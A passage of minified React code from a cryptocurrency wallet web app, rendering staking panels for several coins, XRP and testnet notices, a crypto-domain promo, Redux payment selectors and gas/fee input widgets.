                        fromWallet: !0
                    })
                }, "Stake"));
            if (!n && !l)
                return O.createElement(loader, {
                    visible: !0,
                    width: 30,
                    className: HA.loader
                });
            if (null != s && s.stakedValidators && "singleValidator"in s.stakedValidators && void 0 === s.stakedValidators.singleValidator)
                return O.createElement(O.Fragment, null, O.createElement(loader, {
                    visible: o,
                    width: 30,
                    className: HA.loader
                }), "Staked: ", O.createElement("b", null, "0 QTUM"), O.createElement("br", null), O.createElement("br", null), "Your whole balance will be frozen for about 18 hours (2000 tx confirmations) after you stake", O.createElement("br", null), O.createElement("br", null), !m && O.createElement(O.Fragment, null, O.createElement(Yl, {
                    color: "blue",
                    onClick: u({
                        path: (0,
                        M.RU)("/staking-qtum/staking"),
                        wallet: t,
                        isNewToken: !1,
                        isNewWallet: !1,
                        parentWallet: null,
                        fromWallet: !0
                    })
                }, "Stake")), O.createElement("br", null), O.createElement("br", null), O.createElement("a", {
                    href: "https://wallet.barrons.space/staking/earn-qtum",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Get a reward for staking QTUM ", O.createElement("img", {
                    src: Bp,
                    className: HA.external,
                    alt: ""
                })));
            if (null != s && s.stakedValidators && "singleValidator"in (null == s ? void 0 : s.stakedValidators)) {
                const e = s.stakedValidators.singleValidator
                  , a = null == e ? void 0 : e.validator
                  , n = Number((null == e ? void 0 : e.stakedAmount) || 0) / 1e8 < 100
                  , r = null != a && a.title ? O.createElement("div", null, "Validator: ", O.createElement("b", null, null == a ? void 0 : a.title)) : O.createElement("div", null, "Validator: ", O.createElement("b", null, formatAddress(null == a ? void 0 : a.address, 6)))
                  , l = O.createElement("div", {
                    className: HA.wrapperLine,
                    key: `stake-qtum-info${null == a ? void 0 : a.title}`
                }, "Staked: ", O.createElement("b", {
                    className: HA.userSelect
                }, (null == e ? void 0 : e.stakedAmount) || 0, " QTUM"), " ", O.createElement(jA, {
                    value: d((null == e ? void 0 : e.stakedAmount) || 0, t)
                }), O.createElement("br", null), "Annual yield: ", O.createElement("b", null, null == a ? void 0 : a.annualYield, "%"), O.createElement("br", null), "Reward frequency: ", O.createElement("b", null, null == a ? void 0 : a.rewardFrequency), O.createElement("br", null), r, "Address: ", O.createElement("b", {
                    className: HA.userSelect
                }, null == a ? void 0 : a.address), O.createElement("br", null), (null == e ? void 0 : e.frozenUntil) && O.createElement(O.Fragment, null, "Balance is locked for: ", O.createElement("b", {
                    className: HA.userSelect
                }, null == e ? void 0 : e.frozenUntil, "h"), O.createElement("br", null)), n && O.createElement("p", {
                    style: {
                        color: "red",
                        marginBottom: "0px"
                    }
                }, "Your real APR is decreased because your staked amount is less than recommended. Top up your staking balance to at least 100 QTUM to receive the expected APR."), O.createElement("br", null));
                return O.createElement("div", {
                    className: HA.wrapperPanel
                }, O.createElement(loader, {
                    visible: o,
                    width: 30,
                    className: HA.loader
                }), l, !m && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                    to: `${(0,
                    M.RU)()}/staking-qtum/staking?walletFrom=${t.uuid}`
                }, O.createElement(Yl, {
                    color: "blue"
                }, "Change Validator"))), O.createElement("br", null), O.createElement("br", null), O.createElement("a", {
                    href: "https://wallet.barrons.space/staking/earn-qtum",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Get a reward for staking QTUM ", O.createElement("img", {
                    src: Bp,
                    className: HA.external,
                    alt: ""
                })))
            }
            return null
        }
          , GB = (0,
        j.EN)(withSettingsDisablement(StakingPanel))
          , QtumStaking = e => {
            let {wallet: t} = e;
            return "qtum" !== t.currency ? null : O.createElement("div", {
                className: UB
            }, O.createElement(label, null, "QTUM Information"), O.createElement(GB, {
                wallet: t
            }))
        }
          , VB = "ada_wrapper_Cs6S0 main_block_15zml"
          , AdaStakingMain = e => {
            let {wallet: t} = e;
            return "ada-shelley" !== t.currency ? null : O.createElement("div", {
                className: VB
            }, O.createElement(label, null, "ADA Information"), O.createElement(LI, {
                wallet: t
            }))
        }
          , KB = AdaStakingMain;
        function AtomStakingMain(e) {
            let {wallet: t} = e;
            return "atom" !== t.currency ? null : O.createElement("div", {
                className: kx.wrapper
            }, O.createElement(label, null, "ATOM Information"), O.createElement(kI, {
                wallet: t
            }))
        }
        const EosInformation = e => {
            let {wallet: t} = e;
            return "eos" !== t.currency ? null : O.createElement("div", {
                className: sI
            }, O.createElement("div", {
                className: oI
            }, "EOS Information"), O.createElement("div", {
                className: cI
            }, t.address && O.createElement("div", null, O.createElement("div", {
                className: pI
            }, O.createElement("span", {
                className: uI
            }, "Address:"), O.createElement("b", null, t.address, " ", O.createElement(button_copy, {
                text: t.address,
                className: dI
            }))))), O.createElement(_I, {
                wallet: t
            }))
        }
          , HB = EosInformation;
        function EthStakingInfo(e) {
            let {wallet: t} = e;
            return !["eth", "ropsten"].includes(t.currency) || t.type !== we.uQ.ETH_LIKE_WALLET && t.type !== we.uQ.ETH_LIKE_LEDGER_WALLET ? null : O.createElement("div", {
                className: DA.wrapper
            }, O.createElement(label, {
                className: DA.label
            }, "ETH Staking"), O.createElement(CI, {
                wallet: t
            }))
        }
        const KmdClaimPanel = e => {
            let {wallet: t} = e;
            return "kmd" !== t.currency ? null : O.createElement("div", {
                className: iP
            }, O.createElement("div", {
                className: oP
            }, "KMD Information"), O.createElement(SP, {
                wallet: t
            }))
        }
          , zB = KmdClaimPanel;
        function OneStakingMain(e) {
            let {wallet: t} = e;
            return "one" !== t.currency ? null : O.createElement("div", {
                className: HA.wrapper
            }, O.createElement(label, null, "ONE Information"), O.createElement(aI, {
                wallet: t
            }))
        }
        function OntStakingInfo(e) {
            let {wallet: t} = e;
            return "ont" !== t.currency ? null : O.createElement("div", {
                className: Fx
            }, O.createElement(label, {
                className: Wx
            }, "ONT Staking"), O.createElement($x, {
                wallet: t
            }))
        }
        const jB = "ropsten_wrapper_2M3iY main_block_15zml"
          , $B = "ropsten_walletNotification_1OF0D";
        function RopstenInformation(e) {
            let {currency: t} = e;
            return "ropsten" !== t ? null : O.createElement("div", {
                className: jB
            }, O.createElement("div", {
                className: $B
            }, "This is Ethereum testnet, which means tokens and coins in this network do not correspond with the main network and are probably worth nothing. This wallet is for testing purposes only. Never send coins from mainnet to this address.", O.createElement("br", null), O.createElement("br", null), "To get your free Ropsten Coins follow the", " ", O.createElement("a", {
                href: "https://faucet.ropsten.be/",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "link"), "."))
        }
        function TrxStakingInfo(e) {
            let {wallet: t} = e;
            return "trx" !== t.currency || t.family ? null : O.createElement("div", {
                className: KA.wrapper
            }, O.createElement("div", {
                className: KA.relativeWrapper
            }, O.createElement(label, {
                className: KA.label
            }, "TRON Staking"), O.createElement(Nx, {
                wallet: t
            })))
        }
        const ZB = "xrp_wrapper_39gfK main_block_15zml"
          , YB = "xrp_walletNotification_2IdSR"
          , qB = "xrp_wrapperAirdrop_zdxHC main_block_15zml";
        function XrpInformation(e) {
            let {wallet: t} = e;
            const [a,n] = (0,
            O.useState)({
                status: !1
            });
            (0,
            O.useEffect)(( () => {
                async function loadSparkAirdropInformation() {
                    try {
                        const e = await getSparkAirdropInformation(t.currency, t.address);
                        n(e)
                    } catch {}
                }
                "xrp" === t.currency && loadSparkAirdropInformation()
            }
            ), [t.currency, t.address]);
            return "xrp" !== t.currency ? null : O.createElement(O.Fragment, null, a.status && O.createElement(O.Fragment, null, O.createElement("div", {
                className: qB
            }, O.createElement(label, null, "Spark airdrop"), O.createElement(XrpSparcAirdrop, {
                wallet: t
            })), O.createElement("div", {
                className: ZB
            }, O.createElement("div", {
                className: YB
            }, "You need ", O.createElement("b", null, "10 XRP"), " minimum to activate your XRP address.", O.createElement("br", null), O.createElement("br", null), "This amount you can either transfer from another address or send it to the new address via exchange service in order to start using your account.", O.createElement("br", null), O.createElement("br", null), O.createElement("b", null, "10 XRP"), " is the current minimum reserve requirement according to ", O.createElement("a", {
                href: "https://xrpl.org/docs/concepts/accounts/reserves",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "xrpl.org/docs/concepts/accounts/reserves"), "."))))
        }
        const XB = "xtz_wrapper_2XORV main_block_15zml";
        function XtzStaking(e) {
            let {wallet: t} = e;
            return "xtz" !== t.currency ? null : O.createElement("div", {
                className: XB
            }, O.createElement(label, null, "XTZ Information"), O.createElement(Sx, {
                wallet: t
            }))
        }
        function zil_XtzStaking(e) {
            let {wallet: t} = e;
            return "zil" !== t.currency ? null : O.createElement("div", {
                className: FI
            }, O.createElement(label, null, "ZIL Staking"), O.createElement(eP, {
                wallet: t
            }))
        }
        function BchSplitMain(e) {
            let {wallet: t} = e;
            return t ? t.currency !== _e.ND.bch && t.currency !== _e.ND.xec ? null : O.createElement("div", {
                className: jP.wrapper
            }, O.createElement(WalletAddress, {
                wallet: t
            })) : null
        }
        BchSplitMain.propTypes = {
            wallet: as().object.isRequired
        };
        const BnbTokenStakingPanel = e => {
            let {wallet: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            $.v9)(ax)
              , r = undefined
              , l = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , [s,i] = (0,
            O.useState)("0")
              , [o,c] = (0,
            O.useState)(!0)
              , u = Boolean(!n && t);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (u && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey
                    };
                    a(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: []
                    }))
                }
            }
            ), [u, a, t]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    c(!0);
                    i("");
                    a(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (n) {
                    const {totalRewards: e} = n.dto;
                    e && i(e.toString());
                    c(!1)
                }
            }
            ), [n]);
            (0,
            O.useEffect)((function useStakeInfoFromStorage() {
                if (l) {
                    const {totalRewards: e} = l.dto;
                    e && i(e.toString())
                }
            }
            ), [l]);
            const {convertToFiat: d} = useConverter()
              , m = t.subWallets.find((e => "now-e68" === e.currency || "now-e68" === e.smartContract));
            return n || l || !o ? O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: o,
                width: 30,
                className: kx.loader
            }), "Staked:", " ", O.createElement("b", {
                className: kx.userSelect
            }, (0,
            Ko.yF)(s), " ", "NOW"), " ", O.createElement(jA, {
                value: d(s || void 0, m)
            }), O.createElement("br", null), O.createElement("br", null), !t.watchOnly && O.createElement(O.Fragment, null, O.createElement("div", {
                className: kx.inlineButtons
            }, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-bnb/staking?walletFrom=${(null == m ? void 0 : m.uuid) || ""}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), (0,
            Ko.gt)(s, 0) && O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-bnb/unstaking?walletFrom=${(null == m ? void 0 : m.uuid) || ""}`
            }, O.createElement(Yl, {
                color: "simple"
            }, "Unstake"))), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://changenow.io/tokens#calculator",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "ChangeNOW staking info and calculator", O.createElement("img", {
                src: Bp,
                className: kx.external,
                alt: ""
            }))) : O.createElement(loader, {
                visible: !0,
                width: 30,
                className: kx.loader
            })
        }
          , QB = withSettingsDisablement(BnbTokenStakingPanel)
          , JB = "bnb_wrapper_3OISD main_block_15zml"
          , eO = "bnb_inlineButtons_gec1b"
          , BnbTokenStakingMain = e => {
            let {wallet: t} = e;
            const a = (0,
            $.v9)(lu);
            if ("bnb" !== t.family || "now-e68" !== t.currency && "now" !== t.currency)
                return null;
            const n = t.uuid ? a(t.uuid) : void 0;
            return n ? O.createElement("div", {
                className: JB
            }, O.createElement(label, null, "ChangeNOW"), O.createElement(QB, {
                wallet: n
            })) : null
        }
          , tO = BnbTokenStakingMain
          , CloClaimPanel = e => {
            let {wallet: t} = e;
            return "clo" !== t.currency ? null : O.createElement("div", {
                className: NP.wrapper
            }, O.createElement("div", {
                className: NP.titleSection
            }, "CLO v2 staking"), O.createElement(GP, {
                wallet: t
            }))
        }
          , aO = CloClaimPanel
          , nO = "neo_wrapper_K9Am- main_block_15zml";
        function NeoGasClaimMain(e) {
            let {wallet: t} = e;
            return "neo" !== t.currency && "gas" !== t.currency ? null : O.createElement("div", {
                className: nO
            }, O.createElement(label, null, "NEO Gas Claim"), O.createElement(NeoGasClaim, {
                wallet: t
            }))
        }
        function XmrDataPanelWrapper(e) {
            return "xmr" === e.wallet.currency ? O.createElement("div", {
                className: sL
            }, O.createElement("div", null, O.createElement(label, {
                className: bL
            }, "XMR Information"), O.createElement(XmrDataPanel, e))) : null
        }
        const rO = "multisig_wrapper_tdH-J main_block_15zml"
          , lO = "multisig_walletNotification_3ZEsY";
        function MultisigInformation() {
            return O.createElement("div", {
                className: rO
            }, O.createElement("div", {
                className: lO
            }, "This is a Multisig address. When sending funds to this address, keep in mind that you must have the confirmation of other participants to manage the funds."))
        }
        const StakingBlock = e => {
            let {wallet: t, newCoinOrToken: a} = e;
            return O.createElement("div", null, t && O.createElement(O.Fragment, null, O.createElement(_m, {
                wallet: t,
                type: Xd,
                className: ZF.wrapperNotifications
            }), O.createElement(KB, {
                wallet: t
            }), O.createElement(AtomStakingMain, {
                wallet: t
            }), O.createElement(QtumStaking, {
                wallet: t
            }), O.createElement(HB, {
                wallet: t
            }), O.createElement(EthStakingInfo, {
                wallet: t
            }), O.createElement(zB, {
                wallet: t
            }), O.createElement(OneStakingMain, {
                wallet: t
            }), O.createElement(OntStakingInfo, {
                wallet: t
            }), O.createElement(RopstenInformation, {
                currency: t.currency
            }), O.createElement(TrxResourcesInformation, {
                wallet: t
            }), O.createElement(TrxStakingInfo, {
                wallet: t
            }), O.createElement(XrpInformation, {
                wallet: t
            }), O.createElement(XtzStaking, {
                wallet: t
            }), O.createElement(zil_XtzStaking, {
                wallet: t
            })), t && !t.watchOnly && !a && O.createElement(O.Fragment, null, O.createElement(BchSplitMain, {
                wallet: t
            }), O.createElement(tO, {
                wallet: t
            }), O.createElement(aO, {
                wallet: t
            }), O.createElement(FioAddressDetails, {
                wallet: t
            }), O.createElement(NeoGasClaimMain, {
                wallet: t
            }), O.createElement(XmrDataPanelWrapper, {
                wallet: t
            })), t && !a && O.createElement(O.Fragment, null, O.createElement(_m, {
                wallet: t,
                type: qd,
                className: ZF.wrapperNotifications
            })), t && t.multisigId && O.createElement(MultisigInformation, null))
        }
          , sO = a.p + "3832a08753a8fd4f8120bb75d1e05726.svg"
          , iO = a.p + "4db0da7db8ef9019297eff6da4d6ace9.svg"
          , oO = "label-ud_wrapper_1c5RT app_wrapperBlock_2EpA3"
          , cO = "label-ud_wrapperLabel_2NwVY"
          , uO = "label-ud_promoBlock_2S0lD"
          , dO = "label-ud_promoWrapper_2QHWo"
          , mO = "label-ud_promoHeader_1Sr1m"
          , pO = "label-ud_promoBlockUd_176cL"
          , fO = "label-ud_udIcon_2J53H"
          , EO = "label-ud_linkToCryptoDomains_2oU4E"
          , hO = "label-ud_linkIcon_zhZmg"
          , gO = "label-ud_linkRef_2VQ2T"
          , yO = "label-ud_noWhiteSpace_39QC0"
          , vO = "label-ud_selfCenter_19YD2"
          , LabelUd_LabelUd = () => {
            const e = (0,
            $.v9)(Ot);
            return O.createElement("div", {
                className: Ht()(oO, cO)
            }, O.createElement("div", {
                className: Ht()(uO, pO)
            }, O.createElement("div", {
                className: dO
            }, O.createElement("div", {
                className: mO
            }, O.createElement("h4", null, "Domain names with superpowers"), O.createElement("span", null, O.createElement("img", {
                src: sO,
                alt: "",
                className: fO
            }))), O.createElement("p", null, "Replace cryptocurrency addresses with a human readable name"), O.createElement("div", {
                className: EO
            }, O.createElement("a", {
                href: "https://wallet.barrons.space/academy/blockchain/unstoppable-domains-2022-review/",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "How to use crypto domains?"), " ", O.createElement("a", {
                className: gO,
                href: "https://wallet.barrons.space/academy/blockchain/unstoppable-domains-2022-review/",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                src: "dark" === e ? iO : Bp,
                className: hO,
                alt: ""
            })))), O.createElement("div", {
                className: Ht()(yO, vO)
            }, O.createElement("a", {
                href: "https://unstoppabledomains.com/?irclickid=zg4WXzXAqxyIRukTHlSCwSkLUkDwegRPjXKy080&irpid=3512711&irgwc=1",
                target: "_blank",
                rel: "noreferrer"
            }, O.createElement(Yl, {
                color: "blue",
                size: "big",
                radius: "large"
            }, "Buy")))))
        }
          , _O = {
            changeCryptoWallet: (0,
            te.createAction)("@PAYMENT/changeCryptoWallet")(),
            changeFiatWallet: (0,
            te.createAction)("@PAYMENT/changeFiatWallet")(),
            changeFiatWalletCommit: (0,
            te.createAction)("@PAYMENT/changeWallets.COMMIT")(),
            changeSide: (0,
            te.createAction)("@PAYMENT/changeSide.COMMIT")(),
            errorCheck: (0,
            te.createAction)("@PAYMENT/errorCheck")(),
            errorCheckCommit: (0,
            te.createAction)("@PAYMENT/errorCheck.COMMIT")(),
            changeCryptoAmount: (0,
            te.createAction)("@PAYMENT/changeCryptoAmount.COMMIT")(),
            changeFiatAmount: (0,
            te.createAction)("@PAYMENT/changeFiatAmount.COMMIT")(),
            setIsFiatSupported: (0,
            te.createAction)("@PAYMENT/setIsFiatSupported.COMMIT")(),
            setOptimalPurchase: (0,
            te.createAction)("@PAYMENT/setOptimalPurchase.COMMIT")(),
            setLimitsCommit: (0,
            te.createAction)("@PAYMENT/setLimitsCommit.COMMIT")(),
            setAmountPaymentCreateTransaction: (0,
            te.createAction)("@PAYMENT/setAmountPaymentCreateTransaction.COMMIT")(),
            setPaymentCreateTransaction: (0,
            te.createAction)("@PAYMENT/setPaymentCreateTransaction.COMMIT")(),
            fetchPartners: (0,
            te.createAction)("@PAYMENT/fetchPartners")(),
            fetchPartnersIsLoading: (0,
            te.createAction)("@PAYMENT/fetchPartnersIsLoading.COMMIT")(),
            fetchPartnersCommit: (0,
            te.createAction)("@PAYMENT/fetchPartnersCommit.COMMIT")(),
            fetchPartnersIsError: (0,
            te.createAction)("@PAYMENT/fetchPartnersIsError.COMMIT")(),
            fetchEstimate: (0,
            te.createAction)("@PAYMENT/fetchEstimate")(),
            fetchEstimateIsLoading: (0,
            te.createAction)("@PAYMENT/fetchEstimateIsLoading.COMMIT")(),
            fetchEstimateCommit: (0,
            te.createAction)("@PAYMENT/fetchEstimate.COMMIT")(),
            fetchLimits: (0,
            te.createAction)("@PAYMENT/fetchLimits")(),
            fetchLimitsIsLoading: (0,
            te.createAction)("@PAYMENT/fetchLimitsIsLoading.COMMIT")(),
            fetchLimitsCommit: (0,
            te.createAction)("@PAYMENT/fetchLimits.COMMIT")(),
            changePartner: (0,
            te.createAction)("@PAYMENT/changePartner.COMMIT")(),
            initGetCurrencies: (0,
            te.createAction)("@PAYMENT/initGetCurrencies")(),
            setIsLoadingGetCurrencies: (0,
            te.createAction)("@PAYMENT/setIsLoadingGetCurrencies.COMMIT")(),
            getCurrenciesCommit: (0,
            te.createAction)("@PAYMENT/getCurrenciesCommit.COMMIT")()
        }
          , paymentSelector = e => e.payment
          , wO = (0,
        _t.P1)(paymentSelector, (e => e.side))
          , bO = (0,
        _t.P1)(paymentSelector, (e => e.fiatWallet))
          , kO = (0,
        _t.P1)(paymentSelector, (e => e.cryptoAmount))
          , SO = (0,
        _t.P1)(paymentSelector, (e => e.fiatAmount))
          , CO = (0,
        _t.P1)(paymentSelector, (e => e.paymentCreateTransaction))
          , NO = (0,
        _t.P1)(paymentSelector, (e => e.isAmountError))
          , TO = (0,
        _t.P1)(paymentSelector, (e => e.optimalPurchase))
          , AO = (0,
        _t.P1)(paymentSelector, (e => e.isFiatSupported))
          , xO = (0,
        _t.P1)(paymentSelector, (e => e.currenciesIsLoading))
          , IO = (0,
        _t.P1)(paymentSelector, (e => e.wallets))
          , PO = (0,
        _t.P1)(paymentSelector, (e => e.walletsHash))
          , LO = (0,
        _t.P1)(paymentSelector, (e => e.partnersIsError))
          , FO = (0,
        _t.P1)(paymentSelector, (e => e.partnersIsLoading))
          , WO = (0,
        _t.P1)(paymentSelector, (e => e.partners))
          , RO = (0,
        _t.P1)(paymentSelector, (e => e.partner))
          , BO = (0,
        _t.P1)(paymentSelector, (e => e.maxEstimate))
          , OO = (0,
        _t.P1)(paymentSelector, (e => e.maxEstimate))
          , DO = (0,
        _t.P1)(paymentSelector, (e => e.estimates))
          , MO = (0,
        _t.P1)(paymentSelector, (e => e.tokenList))
          , UO = (0,
        _t.P1)(paymentSelector, (e => e.fiatList))
          , GO = (0,
        _t.P1)(paymentSelector, (e => e.coinList))
          , VO = (0,
        _t.P1)(paymentSelector, (e => e.limitsIsLoading))
          , KO = (0,
        _t.P1)(paymentSelector, (e => e.limits))
          , HO = (0,
        _t.P1)(paymentSelector, (e => e.estimateIsLoading))
          , zO = (0,
        _t.P1)(paymentSelector, (e => e.estimates))
          , jO = (0,
        _t.P1)(paymentSelector, (e => ({
            isLoadingGetCurrencies: e.isLoadingGetCurrencies
        })))
          , $O = (0,
        _t.P1)(paymentSelector, (e => ({
            fiatList: e.fiatList,
            coinList: e.coinList,
            tokenList: e.tokenList,
            partners: e.partners
        })))
          , ZO = {}
          , BoardMainPage_BoardMainPage = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            O.useRef)(null)
              , a = (0,
            O.useRef)(null)
              , [n,r] = (0,
            O.useState)(null)
              , [l,s] = (0,
            O.useState)(null)
              , [i,o] = (0,
            O.useState)(!1)
              , c = (0,
            $.v9)(GO)
              , u = (0,
            $.v9)(MO)
              , d = (0,
            $.v9)($c)
              , m = (0,
            $.v9)(eu)
              , p = (0,
            $.v9)(tu)
              , f = n || p || d[0] || ZO
              , E = useLocationSearch();
            (0,
            O.useEffect)(( () => {
                const t = new AbortController;
                e(_O.initGetCurrencies({
                    side: "buy",
                    abortController: t
                }));
                return () => {
                    t.abort()
                }
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                l && l.scrollIntoView({
                    block: "start",
                    inline: "nearest",
                    behavior: "smooth"
                })
            }
            ), [E.anchor, l, f]);
            (0,
            O.useEffect)(( () => {
                "staking" === E.anchor && null != t && t.current ? s(null == t ? void 0 : t.current) : null != a && a.current && (0,
                M.d)() ? s(null == a ? void 0 : a.current) : s(null)
            }
            ), [E.anchor, f]);
            (0,
            O.useEffect)(( () => {
                if (null != E && E.wallet) {
                    const t = m(E.wallet);
                    if (t) {
                        r(null);
                        e(setActiveWallet(t));
                        return
                    }
                } else if (E.isNewWallet || E.isNewToken) {
                    const e = {
                        ...E
                    };
                    r(e)
                } else
                    r(null)
            }
            ), [E]);
            (0,
            O.useEffect)(( () => {
                let e = !1;
                if (f && f.smartContract && f.family && u) {
                    var t, a;
                    e = -1 !== (null == c ? void 0 : c.indexOf(f.family.toLowerCase())) && f.family in u && ((null === (t = u[f.family]) || void 0 === t ? void 0 : t.includes(f.smartContract)) || (null === (a = u[f.family]) || void 0 === a ? void 0 : a.includes(f.smartContract.toLowerCase())));
                    o(e)
                }
            }
            ), [f, u, c]);
            return d.length || n ? O.createElement(O.Fragment, null, O.createElement("div", {
                ref: a,
                className: ZF.wrapper
            }, O.createElement("div", {
                className: ZF.block
            }, O.createElement(DashboardMenu, null), O.createElement(bR, {
                wallet: f,
                newCoinOrToken: n,
                isTokenAvailableForBuy: i,
                activeWallet: p,
                setNewCoinOrToken: r,
                params: {
                    isSubWallet: E.isSubWallet,
                    isNewWallet: E.isNewWallet,
                    isNewToken: E.isNewToken
                },
                buySupportedCurrencies: c
            })), f.watchOnly && O.createElement(ui_message, null, "This is a Watch Only address. Do not send funds to this address if you do not control it. Kindly import your private keys to unlock sending functionality"), O.createElement("div", {
                ref: t
            }, O.createElement(StakingBlock, {
                wallet: f,
                newCoinOrToken: n
            })), O.createElement(LabelUd_LabelUd, null), O.createElement(MB, {
                wallet: f,
                params: E,
                newCoinOrToken: n
            }))) : O.createElement("div", {
                className: ZF.wrapper
            }, O.createElement("div", {
                className: ZF.block
            }, O.createElement(DashboardMenu, null), O.createElement(empty_wallets, null)))
        }
          , YO = "panel-right_block_UH0mN"
          , qO = "panel-right_message_PGFL1"
          , Block = e => {
            let {children: t, className: a} = e;
            return O.createElement("div", {
                className: Ht()(YO, a)
            }, t)
        }
        ;
        Block.displayName = "Block";
        const XO = Block
          , panel_right_image = e => {
            let {children: t, src: a, style: n} = e;
            const [r,l] = (0,
            O.useState)(!1)
              , s = (0,
            O.useCallback)(( () => {
                l(!0)
            }
            ), []);
            return O.createElement("div", null, O.createElement("img", {
                src: a,
                alt: "",
                style: {
                    display: "none"
                },
                onLoad: s
            }), r && O.createElement(O.Fragment, null, O.createElement("img", {
                src: a,
                alt: "",
                style: n
            }), O.createElement("p", null, t)))
        }
          , message = e => {
            let {children: t} = e;
            return O.createElement("div", {
                className: qO
            }, t)
        }
          , default_fee_per_byte = e => {
            const [t,a] = (0,
            O.useState)(null);
            (0,
            O.useEffect)(( () => {
                async function fetchDefaultFee() {
                    const t = await Se.Z.getApiByWallet(e);
                    if (t.getDefaultFeePerKb) {
                        const e = await t.getDefaultFeePerKb();
                        a(e)
                    }
                }
                e && fetchDefaultFee()
            }
            ), [null == e ? void 0 : e.uuid]);
            return [t]
        }
          , QO = "sldmqp1kd";
        function isSet(e) {
            return "" !== e && null != e && "undefined" !== e
        }
        function sortObject(e) {
            const t = {};
            Object.keys(e).sort().forEach((a => {
                isSet(e[a]) && (t[a] = String(e[a]))
            }
            ));
            return t
        }
        function toHashUrlParams(e) {
            const t = JSON.stringify(sortObject(e));
            return (0,
            Q.PBKDF2)(t, QO).toString()
        }
        function checkHashParams(e) {
            let {urlid: t, ...a} = e;
            return toHashUrlParams(a) === t
        }
        const JO = "inputs-sliders_wrapper_3-ErX"
          , eD = "inputs-sliders_inputWrapper_YnP54"
          , tD = "inputs-sliders_isOpen_2S5Wb"
          , aD = "inputs-sliders_fiatAmount_1I1zN"
          , nD = "inputs-sliders_sliderTitle_hBsvK"
          , rD = "inputs-sliders_loader_1oOgS"
          , lD = "inputs-sliders_speed_ikO-7";
        let sD;
        const InputGasPrice = e => {
            let {wallet: t, gasPrice: a, gasLimit: n, onChange: r} = e;
            const [l,s] = (0,
            O.useState)(null)
              , [i,o] = (0,
            O.useState)("GWei")
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(!1);
            async function fetchGasPrice(e) {
                const t = await e.getGasPrice();
                s(t);
                u(!0)
            }
            (0,
            O.useEffect)(( () => {
                async function fetchAdapter() {
                    const e = await Se.Z.getApiByWallet(t)
                      , a = Se.Z.getMetadataByWallet(t);
                    a.gasPriceUnits && o(a.gasPriceUnits);
                    m(e);
                    fetchGasPrice(e)
                }
                t && fetchAdapter()
            }
            ), [null == t ? void 0 : t.uuid]);
            const p = O.useCallback(( () => {
                r(l);
                u(!0)
            }
            ), [l]);
            (0,
            O.useEffect)(( () => {
                if (d) {
                    clearInterval(sD);
                    sD = setInterval(( () => fetchGasPrice(d)), 5e3)
                }
                return () => clearInterval(sD)
            }
            ), [n, a, d]);
            function getTxSpeed(e, t) {
                const n = Number(e)
                  , r = Number(t)
                  , l = Number(a);
                return n < r / 2 ? "slow" : n >= r / 2 && n < r ? "probably slow" : n === r ? "maybe fast" : n < 2 * r && l > r ? "fast" : n >= 2 * r ? "Very fast" : ""
            }
            const f = Math.max(1.5 * l, 99)
              , E = getTxSpeed(a, l);
            return O.createElement("div", {
                className: JO
            }, O.createElement(Ea, {
                value: a || "",
                min: 1,
                max: f,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return r(t)
                }
            }), !a && !c && O.createElement("div", {
                className: rD
            }, O.createElement(LoaderDots, {
                visible: !0
            })), E && O.createElement("div", {
                className: lD
            }, "Tx speed: ", E), O.createElement("span", {
                className: nD
            }, "Default Gas Price ", null === l || isNaN(Number(l)) ? " — " : O.createElement("b", {
                onClick: p
            }, l, " ", i)))
        }
        ;
        InputGasPrice.propTypes = {
            onChange: as().func,
            gasPrice: as().oneOfType([as().number, as().string]),
            gasLimit: as().oneOfType([as().number, as().string]),
            wallet: as().object
        };
        const iD = InputGasPrice
          , fee_per_byte_InputGasPrice = e => {
            let {wallet: t, feePerByte: a, onChange: n} = e;
            const [r] = default_fee_per_byte(t)
              , handleSetDefault = () => n(r)
              , l = 5 * r;
            function getTxSpeed(e, t) {
                return e < t / 2 ? "slow" : e > t / 2 && e < t ? "probably slow" : e === t ? "maybe fast" : e < 2 * t && e > t ? "fast" : e >= 2 * t ? "very fast" : ""
            }
            const s = getTxSpeed(a, Number((0,
            Ko.hC)(r, 4).toString()));
            return O.createElement("div", {
                className: JO
            }, O.createElement(Ea, {
                value: a || "",
                min: 1,
                max: l,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return n(t)
                }
            }), !a && O.createElement("div", {
                className: rD
            }, O.createElement(LoaderDots, {
                visible: !0
            })), s && O.createElement("div", {
                className: lD
            }, "Tx speed: ", s), O.createElement("span", {
                className: nD
            }, "Default Satoshis per byte ", O.createElement("b", {
                onClick: handleSetDefault
            }, r), " Satoshi"))
        }
        ;
        fee_per_byte_InputGasPrice.propTypes = {
            onChange: as().func,
            feePerByte: as().oneOfType([as().number, as().string]),
            wallet: as().object
        };
        const oD = fee_per_byte_InputGasPrice
          , InputFeeValue = e => {
            let {defaultValue: t, value: a, onChange: n, feeWallet: r} = e;
            const handleSetDefault = () => n(t)
              , l = 5 * t;
            return O.createElement("div", {
                className: JO
            }, O.createElement(Ea, {
                value: a || "",
                min: 1,
                max: l,
                onChange: e => {
